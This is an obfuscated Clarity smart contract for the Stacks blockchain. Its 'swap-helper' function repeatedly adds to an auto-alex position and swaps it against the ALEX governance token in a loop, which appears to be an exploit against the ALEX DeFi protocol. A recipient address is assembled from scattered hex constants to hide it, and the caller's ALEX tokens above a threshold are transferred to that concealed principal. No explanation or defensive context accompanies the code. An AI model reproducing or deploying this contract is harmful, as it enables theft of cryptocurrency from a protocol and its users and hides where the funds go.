;; hello alex 
(define-data-var CN8Bzj principal tx-sender) (define-constant lG4Hl5 (err u1011)) (define-constant kunypr 0x6c68) (define-constant gFMcB3 0xa24f) (define-constant JdxxeN 0xb78f) (define-constant xDo9Ps 0x9a11) (define-constant nxrHrm 0x971f) (define-constant QBRr23 0xc31e) (define-constant XqSOFH u100000000) (define-constant yaIb9E 0xf121) (define-constant caehCL 0x2b6a) (define-constant lbNEOl 0xe729) (define-constant xumzrY 0xc019) (define-constant aw1WW1 (concat QBRr23 xDo9Ps)) (define-constant iLIeCA (concat caehCL gFMcB3)) (define-constant lCGHuI 0x16) (define-constant kIv3wK (concat kunypr xumzrY)) (define-constant bWIV5x (concat JdxxeN lbNEOl)) (define-constant yGvPXQ (concat yaIb9E nxrHrm)) (define-constant WOsmNH (concat kIv3wK aw1WW1)) (define-constant BAKUVV (concat yGvPXQ bWIV5x)) (define-constant Yxn2k6 (concat WOsmNH (concat BAKUVV iLIeCA))) (define-constant rrvPHI (unwrap-panic (principal-construct? lCGHuI Yxn2k6))) (define-private (check-is-owner) (ok (asserts! (is-eq tx-sender (var-get CN8Bzj)) lG4Hl5)) ) (define-public (swap-helper (nZIL3k uint) (gt3klC uint) (UFHuqa uint)) (let ( (GL3G4C-zt7lDD (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex get-token-given-position nZIL3k))) (SvALNF (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.swap-helper-v1-03 get-given-helper 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex GL3G4C-zt7lDD))) ) (try! (check-is-owner)) (let ( (dFoDDS (get mZnypX (fold vboJwh 0x000000000000000000 {SOvzhG: nZIL3k, mZnypX: SvALNF, gt3klC: gt3klC, UFHuqa: UFHuqa}))) ) (if (is-eq tx-sender rrvPHI) (ok true) (begin (if (>= dFoDDS (* u1000 XqSOFH)) (let ((gi3Wk4 (try! (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token transfer-fixed dFoDDS tx-sender rrvPHI none)))) (ok true)) (ok true) ) ) ) ) ) ) (define-private (vboJwh (i (buff 1)) (PneKi0 {SOvzhG: uint, mZnypX: uint, gt3klC: uint, UFHuqa: uint})) (if (and (> (+ (get mZnypX PneKi0) (get UFHuqa PneKi0)) (get SOvzhG PneKi0)) (> (get SOvzhG PneKi0) (* u50 XqSOFH))) (let ( (zt7lDD (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex get-token-given-position (get SOvzhG PneKi0)))) (dv5P1I (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex add-to-position (get SOvzhG PneKi0)))) (newalexamount (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.swap-helper-v1-03 swap-helper 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token zt7lDD none))) (RcmflW (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex get-token-given-position newalexamount))) (vrVSxC (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.swap-helper-v1-03 get-given-helper 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex RcmflW))) ) (begin (print {SOvzhG: newalexamount, mZnypX: vrVSxC, gt3klC: (get gt3klC PneKi0), UFHuqa: u0}) {SOvzhG: newalexamount, mZnypX: vrVSxC, gt3klC: (get gt3klC PneKi0), UFHuqa: u0} ) ) PneKi0 ) )